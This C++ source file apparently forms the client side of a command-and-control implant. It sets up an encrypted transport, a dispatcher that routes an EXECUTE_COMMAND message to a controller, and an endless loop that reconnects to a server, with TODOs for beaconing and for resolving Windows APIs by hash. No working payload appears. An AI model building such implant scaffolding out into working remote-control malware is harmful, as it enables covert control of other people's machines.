#include "ClientSubsystem.h"
#include "ComponentFactory.h"

#include <iostream>


/*
ClientSubsystem::ClientSubsystem()
{
	// loadConfig?
	// enable debugging messages (depending on config?)
	setupSubcomponents();
	setupMessaging();
	// setupEvents();
	// setupTasks();
}
*/

ClientSubsystem::ClientSubsystem(
		Config& config) : config_(config)
{
	// do config? 
	// enable debugging messages (depending on config?)
	setupSubcomponents();
	setupMessaging();
	setupEvents();
	// setupTasks();
}

ClientSubsystem::~ClientSubsystem()
{
	if (serializer_)
	{
		delete serializer_;
	}
	if (encoder_)
	{
		delete encoder_;
	}
	if (encryptor_)
	{
		delete encryptor_;
	}
	if (transportLayer_)
	{
		delete transportLayer_;
		//transportLayer_ = 0;
	}
	if (messageHandler_)
	{
		delete messageHandler_;
		//messageHandler_ = 0;
	}
	if (dispatcher_)
	{
		delete dispatcher_;
	}
	if (controller_)
	{
		delete controller_;
	}

}

void ClientSubsystem::setupMessaging()
{

	transportLayer_ = TransportLayerFactory::create(config_.transportLayerType_, config_.server_, config_.port_);
	// TODO: check that serializer and encoder are not null first?
	messageTransformer_ = new MessageTransformer(serializer_, encoder_, encryptor_);
	packer_ = new Packer();

	messageHandler_ = new MessageHandler(transportLayer_, messageTransformer_, packer_);

	controller_ = new Controller(messageHandler_);

	dispatcher_ = new Dispatcher();
}


void ClientSubsystem::setupSubcomponents()
{
	
	serializer_ = ComponentFactory::create(config_.serializerType_);
	encoder_ = ComponentFactory::create(config_.encoderType_);
	encryptor_ = ComponentFactory::create(config_.encryptorType_);
}

// TODO: separate into 2 functions... setupCallbacks() and registerEvents()
void ClientSubsystem::setupEvents()
{
	// transportLayer_ calls back to MessageParser
	transportLayer_->setOnMessage([&](const RawByteBuffer& msg)
	{
			std::cout << "transportLayer_->setOnMessage" << std::endl;
			messageHandler_->handle(msg);
			//dispatcher_->dispatch(messageTransformer_->transform(msg));
	});

	// messageParser_ calls back to Dispatcher
	messageHandler_->setOnMessage([&](const InternalMessage& msg)
	{
			std::cout << "dispatch_->setOnMessage" << std::endl;
			dispatcher_->dispatch(msg);
	});


	//////////////////////////////////////
	// TODO: controller should have a enum block? 
	// that way we can use one overloaded handle function


	dispatcher_->registerHandler(MessageType::DEFAULT, [&](const InternalMessage& msg)
	{
		std::cout << "dispatch_->registerHandler" << std::endl;
		controller_->handleDefault(msg);
	});

	dispatcher_->registerHandler(MessageType::NONE, [&](const InternalMessage& msg)
	{
		std::cout << "dispatch_->registerHandler" << std::endl;
		controller_->handleNone(msg);
	});

	// dispatcher_ executes function associated with MessageType::EXECUTE_COMMAND
	dispatcher_->registerHandler(MessageType::EXECUTE_COMMAND, [&](const InternalMessage& msg)
	{
		std::cout << "dispatch_->registerHandler" << std::endl;
		controller_->handleExecuteCommand(msg);
	});
}

void ClientSubsystem::setupTasks()
{

}


void ClientSubsystem::run() // TODO: rename to start??
{	

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/
	//std::cout << "ClientSubsystem::run()" << std::endl;

	// transportLayer_->connect();
	// std::thread t([this] { transportLayer_->run(); });
	// t.detach();

	std::cout << "ClientSubsystem::run()" << std::endl;

	while (true)
	{
		if (!transportLayer_->isConnected())
		{
			transportLayer_->connect();
		}

		if (transportLayer_->isConnected())
		{
			transportLayer_->receive();
			// TODO:
			// transportLayer_->beacon();
		}
		Sleep(5000);
	}
}
